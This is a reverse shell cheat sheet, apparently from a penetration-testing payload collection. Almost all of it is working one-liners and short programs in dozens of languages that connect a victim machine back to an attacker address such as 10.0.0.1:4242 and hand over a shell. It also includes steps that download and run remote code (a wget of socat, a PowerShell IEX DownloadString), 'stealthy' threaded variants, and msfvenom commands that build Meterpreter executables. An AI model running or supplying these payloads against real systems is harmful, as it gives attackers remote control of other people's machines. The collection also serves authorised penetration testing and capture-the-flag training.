# Reverse Shell Cheat Sheet

## Summary

* [Tools](#tools)
* [Reverse Shell](#reverse-shell)
    * [Awk](#awk)
    * [Automatic Reverse Shell Generator](#revshells)
    * [Bash TCP](#bash-tcp)
    * [Bash UDP](#bash-udp)
    * [C](#c)
    * [Dart](#dart)
    * [Golang](#golang)
    * [Groovy Alternative 1](#groovy-alternative-1)
    * [Groovy](#groovy)
    * [Java Alternative 1](#java-alternative-1)
    * [Java Alternative 2](#java-alternative-2)
    * [Java](#java)
    * [Lua](#lua)
    * [Ncat](#ncat)
    * [Netcat OpenBsd](#netcat-openbsd)
    * [Netcat BusyBox](#netcat-busybox)
    * [Netcat Traditional](#netcat-traditional)
    * [NodeJS](#nodejs)
    * [OpenSSL](#openssl)
    * [Perl](#perl)
    * [PHP](#php)
    * [Powershell](#powershell)
    * [Python](#python)
    * [Ruby](#ruby)
    * [Socat](#socat)
    * [Telnet](#telnet)
    * [War](#war)
    * [Elixir](#elixir)
    * [Pony](#pony)
    * [Julia](#julia)
    * [Chicken](#chicken)
    * [Deno](#deno)
    * [Rust](#rust)
    * [Rakudo](#rakudo)
    * [Crystal](#crystal)
    * [D](#d)
    * [V](#v)
    * [Godot](#godot)
    * [Love2d](#love2d)
    * [Nim](#nim)
    * [Rust](#rust)
    * [Erlang](#erlang)
    * [F#](#fsharp)
    * [TCL](#tcl)
    * [Zig](#zig)
* [Meterpreter Shell](#meterpreter-shell)
    * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
    * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
    * [Linux Staged reverse TCP](#linux-staged-reverse-tcp)
    * [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)
    * [Other platforms](#other-platforms)
* [Spawn TTY Shell](#spawn-tty-shell)
* [References](#references)

## Tools

- [reverse-shell-generator](https://www.revshells.com/) - Hosted Reverse Shell generator ([source](https://github.com/0dayCTF/reverse-shell-generator)) ![image](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)
- [revshellgen](https://github.com/t0thkr1s/revshellgen) -  CLI Reverse Shell generator

## Reverse Shell

### Bash TCP

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```

### Bash UDP

```bash
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

### Socat

```powershell
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```
```powershell
user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Python

Linux only

IPv4
```python
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

IPv4 (No Spaces)
```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

IPv4 (No Spaces, Shortened)
```python
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```
```python
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```
```python
python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

IPv4 (No Spaces, Shortened Further)
```python
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```
```python
python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```
```python
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

IPv6
```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

IPv6 (No Spaces)
```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

IPv6 (No Spaces, Shortened)
```python
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

Windows only (Python2)

```powershell
python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

Windows only (Python3)

```powershell
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```

### PHP

```bash
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

```bash
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Netcat Traditional

```bash
nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242
```

### Netcat OpenBsd

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### Netcat BusyBox

```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### Ncat

```bash
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
```

### OpenSSL

Attacker:
```powershell
user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
user@attack$ ncat --ssl -vv -l -p 4242

user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

TLS-PSK (does not rely on PKI or self-signed certificates)
```bash
# generate 384-bit PSK
# use the generated string as a value for the two PSK variables from below
openssl rand -hex 48 
# server (attacker)
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
# client (victim)
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

### Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

### Awk

```powershell
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();

```

#### Java Alternative 1

```java
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

#### Java Alternative 2
**NOTE**: This is more stealthy

```java
Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();
```

### Telnet
```bash
In Attacker machine start two listeners:
nc -lvp 8080
nc -lvp 8081

In Victime machine run below command:
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```

### War

```java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```


### Lua

Linux only

```powershell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

Windows and Linux

```powershell
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();


or

require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

### Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
NOTE: Java reverse shell also work for Groovy

```java
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### Groovy Alternative 1
**NOTE**: This is more stealthy

```java
Thread.start {
    // Reverse shell here
}
```

### C

Compile with `gcc /tmp/shell.c --output csh && csh`

```csharp
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

### Dart

```java
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("10.0.0.1", 4242).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```


### Elixir

NOTES: https://github.com/Potato-Industries/elixrs

```
defmodule Elixrs do
   def main do
      case :gen_tcp.connect({192,168,8,139}, 9090, [:binary, active: false, send_timeout: 5000]) do
         {:ok, sock} -> 
            loop(sock)
         _ ->
            :timer.sleep(5000) 
            main()
      end
   end

   def loop(sock) do
      case :gen_tcp.recv(sock, 0) do
         {:ok, data} ->
            :gen_tcp.send(sock, System.cmd("/bin/bash", ["-c", data]) |> Tuple.to_list) 
            loop(sock)
         {:error, Reason} ->
            main()
         _ ->
            None
      end
   end
end

Elixrs.main

```

### Pony

NOTES: https://github.com/Potato-Industries/prs

```
use "net"
use "process"
use "files"

class ReadNotify is TCPConnectionNotify
  let _env: Env

  new create(env: Env) =>
    _env = env

  fun ref received(
    conn: TCPConnection ref,
    data: Array[U8] iso,
    times: USize)
    : Bool
  =>
    let client = WriteNotify(conn)
    let notifier: ProcessNotify iso = consume client
    try
      let path = FilePath(_env.root as AmbientAuth, "/bin/bash")?
      let args: Array[String] val = ["bash"]
      let vars: Array[String] val = ["HOME=/"; "PATH=/bin"]
      let auth = _env.root as AmbientAuth
      let pm: ProcessMonitor = ProcessMonitor(auth, auth, consume notifier,
      path, args, vars)
      pm.write(consume data)
    end
    true

  fun ref connect_failed(conn: TCPConnection ref) =>
    None


class WriteNotify is ProcessNotify
  let _conn: TCPConnection

  new iso create(conn: TCPConnection) =>
    _conn = conn

  fun ref stdout(process: ProcessMonitor ref, data: Array[U8] iso) =>
    _conn.write(String.from_array(consume data))

  fun ref stderr(process: ProcessMonitor ref, data: Array[U8] iso) =>
    _conn.write(String.from_array(consume data))


actor Main
  new create(env: Env) =>
    try
      TCPConnection(env.root as AmbientAuth,
        recover ReadNotify(env) end, "192.168.8.139", "9090")
    end
```

### Julia

NOTES: https://github.com/Potato-Industries/jrs

```
julia --eval 'using Sockets;c = connect("192.168.8.139", 9090);while true;cmd = readline(c, keep=true);try;println(c, read(`/bin/bash -c $cmd`, String));catch e;print(c, e);end;end'
```

### Chicken

NOTES: https://github.com/Potato-Industries/chickenrs

```
(import (chicken tcp) (chicken io) (chicken process))
(define-values (sr sw) (tcp-connect "192.168.8.139" 9090))
(define-values (pr pw ps) (process "/bin/bash"))

(define (lines)
  (let ((x (read-line pr)))
    (if (not (equal? x "[ENDEND]"))
      (begin
        (print x)
        (write-line x sw)
        (lines)))))

(define (loop)
(write-line (string-append (read-line sr) "; echo '[ENDEND]'") pw)
(lines)
(loop))

(loop)

```

### Deno

NOTES: https://github.com/Potato-Industries/denors

```
const c = await Deno.connect({ hostname: "192.168.8.139", port: 9090, transport: "tcp" });
while(1) {
    let buf=new Uint8Array(1024);
    const n=await c.read(buf) || 0;
    buf=buf.slice(0, n);
    const cmd = new TextDecoder().decode(buf);
    
    const p = Deno.run({
      cmd: ["/bin/bash", "-c", cmd],
      stdout: "piped",
      stderr: "piped"
    });

    const { code } = await p.status();
    const rawOutput = await p.output();
    const rawError = await p.stderrOutput();

    if (code === 0) {
       await c.write(rawOutput);
    } else {
       await c.write(rawError);
    }
}

```

### Rakudo

NOTES: https://github.com/Potato-Industries/rrs

```
await IO::Socket::Async.connect('localhost', 9090).then( -> $promise {
    while 1 {
        given $promise.result {
            react {
                whenever .Supply() -> $v {
                    my $p = shell $v, :out;
                    my $o = $p.out.slurp(:close);
                    .print($o);
                    done;
                 }
             }
        }
    }
    done;
});
```

### Crystal

NOTES: https://github.com/Potato-Industries/crs

```
require "process"
require "socket"

c = Socket.tcp(Socket::Family::INET)
c.connect "192.168.1.38", 9090
while true
   m, l = c.receive
   p = Process.new(m.rstrip('\n'), output: Process::Redirect::Pipe, shell: true)
   c << p.output.gets_to_end
end
```

### D

NOTES: 

```
import std.process, std.socket;

void main()
{
   Socket sock = new TcpSocket(new InternetAddress("192.168.1.38", 9090));
   while (true)
   {
      char[] line;
      char[1] buf;
      while(sock.receive(buf))
      {
         line ~= buf;
         if (buf[0] == '\n')
            break;
      }
      if (!line.length)
         break;

      auto os = executeShell(line);
      sock.send(os.output);
   }
}

```

### V

NOTES: https://github.com/Potato-Industries/vrs

```
module main

import net
import io
import os

fn exec(path string) string {
        mut out := ''
        mut line := ''
        mut cmd := os.Command{
                path: path
        }
        cmd.start() or { panic(err) }

        for {
                line = cmd.read_line()
                out += line + '\n'
                if cmd.eof {
                        return out
                }
        }
        return out
}

fn main() {
        mut conn := net.dial_tcp('localhost:8080') ?
        mut reader := io.new_buffered_reader(reader: conn)
        for {
                result := reader.read_line() or { return }
                conn.write_string(exec(result) + '\n') or { return }
        }
}

```

### Godot

NOTES: https://github.com/Potato-Industries/godotrs

```
extends Node

var client = StreamPeerTCP.new()

func _ready():
	OS.set_window_minimized(true)
	set_process(true)
	client.connect_to_host("192.168.1.101", 9999)
        
func _process(delta):
	var bytes = client.get_available_bytes()
	if bytes > 0:
		var output = cmd(str(client.get_string(bytes)))
		client.put_string(str(output))

func cmd(cmd):
	var output = []
	#var pid = OS.execute('cmd.exe', ['/C', cmd], true, output)
	var pid = OS.execute('/bin/sh', ['-c', cmd], true, output)
	return output

```

### Love2d

NOTES: https://github.com/Potato-Industries/lovers

```
love.window.close()

function gogogo ()
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("127.0.0.1", 80);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();
end

if pcall(gogogo) then
   love.event.quit()
else
   love.event.quit()
end
```

### Nim

NOTES: https://github.com/Potato-Industries/nimrs

```
import net, streams, osproc

let c: Socket = newSocket()
c.connect("127.0.0.1", Port(443))

var p = startProcess("cmd.exe", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
var input = p.inputStream()
var output = p.outputStream()

while true:
  let cmds: string = c.recvLine()
  #Linux/MacOS
  #input.writeLine(cmds & ";echo 'DONEDONE'")
  #Windows
  input.writeLine(cmds & " & echo DONEDONE")
  input.flush()
  var o: string
  while output.readLine(o):
    if o == "DONEDONE":
      break
    c.send(o & "\r\L")

```

### Rust

NOTES: https://github.com/Potato-Industries/rustrs

### Erlang

NOTES: https://github.com/Potato-Industries/erlrs

```

-module(erlrs).
-export([main/0, loop/1]).

main() ->
    case gen_tcp:connect("127.0.0.1", 8080,
                [{active,false},
                {send_timeout, 5000},
                {packet, line}]) of
                              
        {ok, Sock} ->
            loop(Sock);
        
        {error, Reason} ->
            timer:sleep(5000),
            main()
    end.

loop(Sock) ->
    case gen_tcp:recv(Sock, 0) of 
        {ok, Data} ->
	    gen_tcp:send(Sock, os:cmd(Data)),
	    loop(Sock);
        
        {error, Reason} ->
            main()
    end.
```

### Fsharp

NOTES: https://github.com/Potato-Industries/fsrs

```
open System
open System.Net
open System.Diagnostics

let rec asyncStdin (stream: System.Net.Sockets.NetworkStream, cmd: Process) =
    async {
        let input = stream.ReadByte() |> Char.ConvertFromUtf32
        cmd.StandardInput.Write(input)

        return! asyncStdin (stream, cmd)
    }

let rec asyncStdout (stream: System.Net.Sockets.NetworkStream, cmd: Process) =
    async {
        let output = cmd.StandardOutput.Read() |> Char.ConvertFromUtf32
        let outbyte = System.Text.Encoding.UTF32.GetBytes(output)
        stream.Write(outbyte, 0, outbyte.Length)

        return! asyncStdout (stream, cmd)
    }

let main =
    let client = new System.Net.Sockets.TcpClient()
    
    client.Connect("127.0.0.1", 8080)

    let stream = client.GetStream()

    let procStartInfo = ProcessStartInfo (
                         FileName = "cmd.exe",
                         RedirectStandardInput = true,
                         RedirectStandardOutput = true,
                         RedirectStandardError = true,
                         UseShellExecute = false,
                         CreateNoWindow = true
    )

    let cmd = new Process(StartInfo = procStartInfo)
    let err = cmd.Start()

    asyncStdin (stream, cmd) |> Async.Start
    asyncStdout (stream, cmd) |> Async.RunSynchronously

    stream.Flush()
    
    System.Threading.Thread.Sleep(TimeSpan.FromSeconds(30.0))
    
main

```

### TCL

```
set chan [socket 192.168.8.139 9090]
while 1 {
   puts $chan [exec /bin/bash -c [gets $chan]]
   flush $chan
}
```

### Zig

NOTES: https://github.com/Potato-Industries/zrs


## Meterpreter Shell

### Windows Staged reverse TCP

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

### Windows Stageless reverse TCP

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

### Linux Staged reverse TCP

```powershell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### Linux Stageless reverse TCP

```powershell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### Other platforms

```powershell
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
